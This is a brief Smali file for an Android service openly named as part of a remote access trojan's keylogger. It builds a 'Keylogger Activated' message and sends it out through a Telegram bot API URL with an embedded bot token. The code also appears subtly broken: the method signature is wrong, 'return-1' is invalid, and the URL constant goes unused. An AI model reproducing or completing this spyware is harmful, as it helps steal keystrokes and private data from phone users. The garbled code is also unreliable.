.class public Lcom/rat/keylogger/KeyLoggerService;
.super Landroid/app/Service;

.method public onStartCommand(Landroid/content/Intent;ILandroid/os/Binder;)I
    .registers 4

    invoke-virtual {p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    const-string v1, "https://api.telegram.org/bot7582895631:AAFpiW_jsxHNIW5TjLrni4uyVL1qowmCh6c/sendMessage"
    const-string v2, "Keylogger Activated: "
    invoke-virtual {v0, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0

    # Send to Telegram API
    invoke-static {v0}, Lcom/rat/TelegramSender;->sendData(Ljava/lang/String;)V
    return-1
.end method